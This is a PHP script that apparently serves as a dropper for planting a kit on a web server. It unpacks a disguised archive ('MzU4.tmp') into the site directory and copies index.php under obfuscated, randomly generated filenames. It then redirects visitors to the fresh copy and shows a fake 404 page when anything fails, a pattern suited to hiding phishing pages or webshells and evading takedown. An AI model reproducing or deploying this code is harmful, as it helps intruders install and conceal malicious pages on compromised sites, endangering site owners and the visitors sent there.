<?php
$path = 'MzU4.tmp';

$sou ="'index.php','',";
$url_2_temp = uniqidReal() . ".php";
$dex = "array('index.php','MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php','{$url_2_temp}'),'',";

$zip = new ZipArchive;
if(!file_exists("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")) {
    if ($zip->open($path) === true) {
        try {
            //unlink( getcwd() . "index.php");
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $filename = $zip->getNameIndex($i);
                $fileinfo = pathinfo($filename);
                if (substr_count($filename, rawurldecode("%5C"))) {
                    $re = str_ireplace(rawurldecode("%5C"), "/", $filename);
                    renamesave($filename);
                    copy("zip://" . $path . "#" . $filename, "./" . $re);
                } else {
                    if ($filename == "index.php") {
                        copy("zip://" . $path . "#" . $filename, "./MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php");
                        $ft = str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php"));
                        file_put_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php", $ft);
                    } else {
                        copy("zip://" . $path . "#" . $filename, "./" . $filename);
                    }
                }
            }
            $zip->close();

            file_put_contents($url_2_temp, @str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")));
            header("Location: {$url_2_temp}");
        } catch (Exception $e) {
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    } else {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}else{
    file_put_contents($url_2_temp, @str_ireplace($sou, $dex, file_get_contents("MzYxODk0MzA3NjEwNDI1OTc3MzU4NzA5NA.php")));
    header("Location: {$url_2_temp}");
}


function renamesave($filename){
    $re = explode(rawurldecode("%5C"), $filename);
    $file = ".";$er = @end($re);
    foreach ($re as $dir){
        $file .= "/" . $dir;
        if(!file_exists($file) && $er != $dir){
            mkdir($file);
        }
    }
}


function uniqidReal($lenght = 13) {
    try {
        if (function_exists("random_bytes")) {
            $bytes = random_bytes(ceil($lenght / 2));
        } elseif (function_exists("openssl_random_pseudo_bytes")) {
            $bytes = openssl_random_pseudo_bytes(ceil($lenght / 2));
        } else {
            return uniqid();
        }
    } catch (Exception $e) {
        return uniqid();
    }
    return substr(bin2hex($bytes), 0, $lenght);
}